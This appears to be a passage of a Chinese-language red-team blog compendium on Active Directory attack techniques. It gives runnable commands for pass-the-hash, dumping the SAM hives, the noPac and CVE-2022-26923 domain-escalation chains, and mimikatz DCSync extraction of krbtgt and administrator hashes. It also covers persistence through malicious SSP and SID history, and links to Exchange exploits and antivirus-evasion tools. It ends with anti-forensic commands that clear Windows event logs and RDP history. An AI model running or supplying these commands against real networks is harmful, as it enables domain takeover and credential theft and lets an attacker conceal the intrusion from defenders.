</code></pre>
<pre><code>secretsdump.py -no-pass cgdomain.com/administrator@10.211.55.200 -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae
</code></pre>
<p><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190359.png"></p>
<p>获取到旧的密码明文hex，还原</p>
<pre><code>python restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b
</code></pre>
<p><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190457.png"></p>
<p>恢复方法2<br>通过wmic, pass the hash 拿到域控制器中的本地管理员权限(域管)</p>
<pre><code>wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38
</code></pre>
<p>然后分别执行,拷贝本机中SAM数据库到本地</p>
<pre><code>- reg save HKLM\SYSTEM system.save
- reg save HKLM\SAM sam.save
- reg save HKLM\SECURITY security.save
- get system.save
- get sam.save
- get security.save
- del /f system.save
- del /f sam.save
- del /f security.save
</code></pre>
<p>提取明文hash</p>
<pre><code>secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
</code></pre>
<p>然后恢复。<br>​    </p>
<h5 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h5><p>漏洞分析：<a target="_blank" rel="noopener" href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">CVE-2021-42287&#x2F;CVE-2021-42278 Weaponisation</a></p>
<p>Exploit：</p>
<pre><code># Create Machine Account
New-MachineAccount -MachineAccount TestSPN -Domain internal.zeroday.lab -DomainController idc1.internal.zeroday.lab -Verbose

# Clear SPNs
Set-DomainObject &quot;CN=TestSPN,CN=Computers,DC=internal,DC=zeroday,DC=lab&quot; -Clear &#39;serviceprincipalname&#39; -Verbose

# Change Machine Account samaccountname
Set-MachineAccountAttribute -MachineAccount TestSPN -Value &quot;IDC1&quot; -Attribute samaccountname -Verbose

# Request TGT
.\Rubeus.exe asktgt /user:IDC1 /password:Password1 /domain:internal.zeroday.lab /dc:idc1.internal.zeroday.lab /nowrap

# Change Machine Account samaccountname
Set-MachineAccountAttribute -MachineAccount TestSPN -Value &quot;TestSPN&quot; -Attribute samaccountname -Verbose

# Request S4U2self
.\Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:idc1.internal.zeroday.lab /self /altservice:LDAP/IDC1.internal.zeroday.lab /ptt /ticket:[TGT]
</code></pre>
<p>一键利用：<a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">noPac</a></p>
<h5 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h5><p>利用ADCS中错误配置的模板进行域提权，详细可参考：<a target="_blank" rel="noopener" href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified_Pre-Owned</a></p>
<p>可利用工具：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify">Certify</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">Certipy</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/eloypgz/certi">certi</a></li>
</ul>
<h5 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h5><p>前提：域内有ADCS<br>Exploit:</p>
<pre><code># 修改可控机器DNS
python certi.py account create cgdomain.com/sanfeng:&#39;1qazXSW@&#39;@10.211.55.200 -dc-ip 10.211.55.200 -user testvul -dns dc2008.cgdomain.com

# 请求证书
python certi.py req &#39;cgdomain.com/testvul$:NUxhMemzaP4rsPnu&#39;@10.211.55.200 -dc-ip 10.211.55.200 -ca cgdomain-DC2008-CA -template &#39;Machine&#39;

# 获取DC hash
python certi.py auth -dc-ip 10.211.55.200 -pfx dc2008.pfx -username dc2008$

# 还原机器DNS
python certi.py account update cgdomain.com/sanfeng:&#39;1qazXSW@&#39;@10.211.55.200 -dc-ip 10.211.55.200 -user testvul -dns testvul.hqcec.com
</code></pre>
<blockquote>
<p>注：此环境的ADCS与DC为同一台机器。真实环境需要根据实际情况进行参数调整。</p>
</blockquote>
<h4 id="获取AD哈希"><a href="#获取AD哈希" class="headerlink" title="获取AD哈希"></a>获取AD哈希</h4><ul>
<li>使用VSS卷影副本 </li>
<li>Ntdsutil中获取NTDS.DIT​​文件 </li>
<li>PowerShell中提取NTDS.DIT –&gt;<a target="_blank" rel="noopener" href="https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy">Invoke-NinaCopy </a></li>
<li>使用Mimikatz提取</li>
</ul>
<pre><code>mimikatz lsadump::lsa /inject exit 
</code></pre>
<ul>
<li>使用PowerShell Mimikatz</li>
<li>使用Mimikatz的DCSync 远程转储Active Directory凭证<br>提取 KRBTGT用户帐户的密码数据：</li>
</ul>
<pre><code>Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt&quot;exit
</code></pre>
<p>管理员用户帐户提取密码数据：</p>
<pre><code>Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator&quot; exit
</code></pre>
<ul>
<li>NTDS.dit中提取哈希<br>使用esedbexport恢复以后使用ntdsxtract提取</li>
</ul>
<h4 id="AD持久化"><a href="#AD持久化" class="headerlink" title="AD持久化"></a>AD持久化</h4><h5 id="活动目录持久性技巧"><a href="#活动目录持久性技巧" class="headerlink" title="活动目录持久性技巧"></a>活动目录持久性技巧</h5><p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1929">https://adsecurity.org/?p=1929</a><br>DS恢复模式密码维护<br>DSRM密码同步 </p>
<blockquote>
<p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:<a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,%E5%8F%AF%E5%8F%82%E8%80%83%EF%BC%9A[%E5%B7%A7%E7%94%A8DSRM%E5%AF%86%E7%A0%81%E5%90%8C%E6%AD%A5%E5%B0%86%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96](http://drops.xmd5.com/static/drops/tips-9297.html)">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)</a></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.dcshadow.com/">DCshadow </a></p>
<h5 id="Security-Support-Provider"><a href="#Security-Support-Provider" class="headerlink" title="Security Support Provider"></a>Security Support Provider</h5><p>简单的理解为SSP就是一个DLL，用来实现身份认证</p>
<pre><code>privilege::debug
misc::memssp
</code></pre>
<p>这样就不需要重启<code>c:/windows/system32</code>可看到新生成的文件kiwissp.log</p>
<h5 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1772">SID History</a></h5><p>SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</p>
<pre><code>mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot;
</code></pre>
<h5 id="AdminSDHolder＆SDProp"><a href="#AdminSDHolder＆SDProp" class="headerlink" title="AdminSDHolder＆SDProp "></a><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1906">AdminSDHolder＆SDProp </a></h5><p>利用AdminSDHolder＆SDProp（重新）获取域管理权限 </p>
<h5 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h5><p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2716">https://adsecurity.org/?p=2716</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86531">策略对象在持久化及横向渗透中的应用</a> </p>
<h5 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h5><p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6812">http://www.vuln.cn/6812</a></p>
<h5 id="Kerberoasting后门"><a href="#Kerberoasting后门" class="headerlink" title="Kerberoasting后门"></a>Kerberoasting后门</h5><p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting">域渗透-Kerberoasting</a></p>
<h5 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h5><p><a target="_blank" rel="noopener" href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence">Backdooring AdminSDHolder for Persistence</a></p>
<h5 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h5><p><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence">Unconstrained Domain Persistence</a></p>
<h5 id="黄金证书"><a href="#黄金证书" class="headerlink" title="黄金证书"></a>黄金证书</h5><p><a target="_blank" rel="noopener" href="https://blog.harmj0y.net/activedirectory/certified-pre-owned/">certified-pre-owned</a></p>
<p>证书伪造：<br><a target="_blank" rel="noopener" href="https://github.com/Ridter/pyForgeCert">pyForgeCert</a></p>
<h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><h5 id="域内主机提权"><a href="#域内主机提权" class="headerlink" title="域内主机提权"></a>域内主机提权</h5><p><a target="_blank" rel="noopener" href="https://github.com/Ridter/SharpAddDomainMachine">SharpAddDomainMachine</a></p>
<h5 id="Exchange的利用"><a href="#Exchange的利用" class="headerlink" title="Exchange的利用"></a>Exchange的利用</h5><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/ridter/owa_info"><strong>owa_info</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/Exchange2domain"><strong>Exchange2domain</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/WyAtu/CVE-2018-8581/"><strong>CVE-2018-8581</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2019-1040"><strong>CVE-2019-1040</strong></a> </li>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2020-0688"><strong>CVE-2020-0688</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Arno0x/NtlmRelayToEWS"><strong>NtlmRelayToEWS</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/ewsManage"><strong>ewsManage</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/h4x0r-dz/CVE-2021-26855"><strong>CVE-2021-26855</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda"><strong>CVE-2021-28482</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/hosch3n/ProxyVulns"><strong>ProxyVulns</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/testanull/ProxyNotShell-PoC"><strong>ProxyNotShell</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/balki97/OWASSRF-CVE-2022-41082-POC"><strong>OWASSRF-ProxyNotShell</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/testanull/518871a2e2057caa2bc9c6ae6634103e"><strong>Tabshell</strong></a></li>
</ul>
<h4 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h4><p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed">《域渗透——Dump Clear-Text Password after KB2871997 installed》</a></p>
<p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6812">《域渗透——Hook PasswordChangeNotify》</a> </p>
<blockquote>
<p>可通过Hook PasswordChangeNotify实时记录域控管理员的新密码 </p>
</blockquote>
<p><a target="_blank" rel="noopener" href="http://www.liuhaihua.cn/archives/179102.html">《域渗透——Local Administrator Password Solution》 </a></p>
<blockquote>
<p>域渗透时要记得留意域内主机的本地管理员账号 </p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">《域渗透——利用SYSVOL还原组策略中保存的密码》 </a></p>
<h4 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h4><ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">BloodHound </a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec </a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/DeathStar">DeathStar</a> </p>
<blockquote>
<p>利用过程：<a target="_blank" rel="noopener" href="http://www.freebuf.com/sectool/160884.html">http://www.freebuf.com/sectool/160884.html</a></p>
</blockquote>
</li>
</ul>
<h3 id="在远程系统上执行程序"><a href="#在远程系统上执行程序" class="headerlink" title="在远程系统上执行程序"></a>在远程系统上执行程序</h3><ul>
<li>At </li>
<li>Psexec </li>
<li>WMIC </li>
<li>Wmiexec </li>
<li>Smbexec </li>
<li>Powershell remoting </li>
<li>DCOM </li>
<li>Winrm (<a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a>)</li>
</ul>
<h3 id="IOT相关"><a href="#IOT相关" class="headerlink" title="IOT相关"></a>IOT相关</h3><ul>
<li>1、路由器 <a target="_blank" rel="noopener" href="https://github.com/reverse-shell/routersploit">routersploit </a></li>
<li>2、打印机 <a target="_blank" rel="noopener" href="https://github.com/RUB-NDS/PRET">PRET </a></li>
<li>3、IOT exp <a target="_blank" rel="noopener" href="https://www.exploitee.rs/">https://www.exploitee.rs/</a></li>
<li>4、相关<br><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/OWASP_Nettacker">OWASP-Nettacker</a><br><a target="_blank" rel="noopener" href="https://github.com/dark-lbp/isf">isf</a><br><a target="_blank" rel="noopener" href="https://github.com/w3h/icsmaster">icsmaster</a></li>
</ul>
<h3 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h3><ul>
<li><a target="_blank" rel="noopener" href="http://www.oxid.it/cain.html">Cain</a> </li>
<li><a target="_blank" rel="noopener" href="https://github.com/Ettercap/ettercap">Ettercap</a> </li>
<li><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder">Responder</a> </li>
<li><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/MITMf">MITMf</a> </li>
<li><a target="_blank" rel="noopener" href="https://github.com/evilsocket/bettercap">3r&#x2F;MITMf)</a></li>
</ul>
<h3 id="规避杀软及检测"><a href="#规避杀软及检测" class="headerlink" title="规避杀软及检测"></a>规避杀软及检测</h3><h4 id="Bypass-Applocker"><a href="#Bypass-Applocker" class="headerlink" title="Bypass Applocker"></a>Bypass Applocker</h4><p><a target="_blank" rel="noopener" href="https://github.com/api0cradle/UltimateAppLockerByPassList">UltimateAppLockerByPassList </a><br><a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a> </p>
<h4 id="BypassAV"><a href="#BypassAV" class="headerlink" title="BypassAV"></a>BypassAV</h4><ul>
<li>Empire </li>
<li>PEspin </li>
<li>Shellter </li>
<li>Ebowla </li>
<li>Veil </li>
<li>PowerShell </li>
<li>Python </li>
<li><a target="_blank" rel="noopener" href="http://www.4hou.com/technology/9379.html">代码注入技术Process Doppelgänging </a></li>
<li>…</li>
</ul>
<h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><h3 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87">Windows日志清除</a></h3><p>获取日志分类列表：</p>
<pre><code>wevtutil el &gt;1.txt
</code></pre>
<p>获取单个日志类别的统计信息：<br>eg.</p>
<pre><code>wevtutil gli &quot;windows powershell&quot;
</code></pre>
<p>回显：</p>
<pre><code>creationTime: 2016-11-28T06:01:37.986Z
lastAccessTime: 2016-11-28T06:01:37.986Z
lastWriteTime: 2017-08-08T08:01:20.979Z
fileSize: 1118208
attributes: 32
numberOfLogRecords: 1228
oldestRecordNumber: 1
</code></pre>
<p>查看指定日志的具体内容：</p>
<pre><code>wevtutil qe /f:text &quot;windows powershell&quot;
</code></pre>
<p>删除单个日志类别的所有信息：</p>
<pre><code>wevtutil cl &quot;windows powershell&quot;
</code></pre>
<h3 id="破坏Windows日志记录功能"><a href="#破坏Windows日志记录功能" class="headerlink" title="破坏Windows日志记录功能"></a>破坏Windows日志记录功能</h3><p>利用工具 </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/hlldz/Invoke-Phant0m">Invoke-Phant0m</a> </li>
<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Windwos-EventLog-Bypass">Windwos-EventLog-Bypass</a></li>
</ul>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><pre><code>run clearlogs 
</code></pre>
<pre><code>clearev 
</code></pre>
<h3 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a>3389登陆记录清除</h3><pre><code>@echo off
@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f
@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a
@exit
</code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://myprefer.github.io">Myperfer</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://myprefer.github.io/post/%E8%BD%AC-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%90%88%E9%9B%86.html">https://myprefer.github.io/post/%E8%BD%AC-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%90%88%E9%9B%86.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E.html" title="WEB攻防-通用漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">WEB攻防-通用漏洞</div></div><div class="info-2"><div class="info-item-1">WEB攻防-通用漏洞大型靶场Vulhub - Docker-Compose file for vulnerability environment SQL注入-补充内容ACCESS注入偏移注入使用场景 知道表名 不知道列名 列名特殊, 无法爆破  注入原理 假设一个表有8个字段，admin表有3个字段。(需要先判断列数)  联合查询payload：union select 1,2,3,4,5,6,7,8 from admin   在我们不知道admin有多少字段的情况下可以尝试payload：union select 1,2,3,4,5,6,7,admin.* from admin，此时页面出错  直到payload：union select 1,2,3,4,5,admin.* from admin时页面返回正常，说明admin表有三个字段  然后通过移动admin.*的位置，就可以回显不同的数据   MYSQL 读取文件 select load_file(&#39;D:/a.txt&#39;);   写入文件 select &#39;xxxx&#39; into outfile...</div></div></div></a><a class="pagination-related" href="/post/WEB%E6%94%BB%E9%98%B2-%E7%89%B9%E6%80%A7%E6%BC%8F%E6%B4%9E.html" title="WEB攻防-特性漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">WEB攻防-特性漏洞</div></div><div class="info-2"><div class="info-item-1">ASP安全 常用组合: windows+IIS+ASP+Access(sql server)  安全问题:MDB默认下载 access数据库文件后缀名一般为asp&#x2F;asa&#x2F;mdb 其中, 浏览器访问asp&#x2F;asa文件时, 文件会被解析执行, 访问mdb文件时会下载该文件 由此可以获取站点敏感数据  ASP后门植入连接 留言板写入一句话木马: ┼攠數畣整爠煥敵瑳∨≡┩愾   密码为a   原理: 网站开启了asp解析，直接访问数据库文件会返回信息，写入一句话木马后进行连接   IIS短文件名探针安全漏洞 原理:  Windows系统为了兼容16位MS-DOS程序，为文件名较长的文件和文件夹生成了对应的Windows...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Myperfer</div><div class="author-info-description">By Myprefer</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88OSINT%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">开源情报信息收集（OSINT）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#github"><span class="toc-number">1.1.1.</span> <span class="toc-text">github</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#whois%E6%9F%A5%E8%AF%A2-%E6%B3%A8%E5%86%8C%E4%BA%BA%E5%8F%8D%E6%9F%A5-%E9%82%AE%E7%AE%B1%E5%8F%8D%E6%9F%A5-%E7%9B%B8%E5%85%B3%E8%B5%84%E4%BA%A7"><span class="toc-number">1.1.2.</span> <span class="toc-text">whois查询&#x2F;注册人反查&#x2F;邮箱反查&#x2F;相关资产</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#google-hacking"><span class="toc-number">1.1.3.</span> <span class="toc-text">google hacking</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%BC%81%E4%B8%9A%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="toc-number">1.2.</span> <span class="toc-text">创建企业密码字典</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E5%85%B8%E5%88%97%E8%A1%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">字典列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">密码生成</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1%E5%88%97%E8%A1%A8%E8%8E%B7%E5%8F%96"><span class="toc-number">1.2.3.</span> <span class="toc-text">邮箱列表获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%AF%86%E7%A0%81%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.2.4.</span> <span class="toc-text">泄露密码查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E4%BC%81%E4%B8%9A%E5%A4%96%E9%83%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%9B%E8%A1%8C%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.5.</span> <span class="toc-text">对企业外部相关信息进行搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">子域名获取</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91"><span class="toc-number">2.</span> <span class="toc-text">进入内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E4%BC%81%E4%B8%9A%E5%BC%B1%E8%B4%A6%E5%8F%B7%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.</span> <span class="toc-text">基于企业弱账号漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">基于系统漏洞进入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F"><span class="toc-number">2.3.</span> <span class="toc-text">网站应用程序渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E7%BA%BFWi-Fi%E6%8E%A5%E5%85%A5"><span class="toc-number">2.4.</span> <span class="toc-text">无线Wi-Fi接入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">隐匿攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-and-Control"><span class="toc-number">3.1.</span> <span class="toc-text">Command and Control</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fronting"><span class="toc-number">3.2.</span> <span class="toc-text">Fronting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86"><span class="toc-number">3.3.</span> <span class="toc-text">代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E5%BA%94%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">内网跨边界应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.</span> <span class="toc-text">内网跨边界转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F"><span class="toc-number">4.2.</span> <span class="toc-text">内网跨边界代理穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EW"><span class="toc-number">4.2.1.</span> <span class="toc-text">EW</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Termite"><span class="toc-number">4.2.2.</span> <span class="toc-text">Termite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%84%9A%E6%9C%AC"><span class="toc-number">4.2.3.</span> <span class="toc-text">代理脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell%E5%8F%8D%E5%BC%B9"><span class="toc-number">4.3.</span> <span class="toc-text">shell反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%A0%E8%BE%93%E5%92%8C%E4%B8%8B%E8%BD%BD"><span class="toc-number">4.4.</span> <span 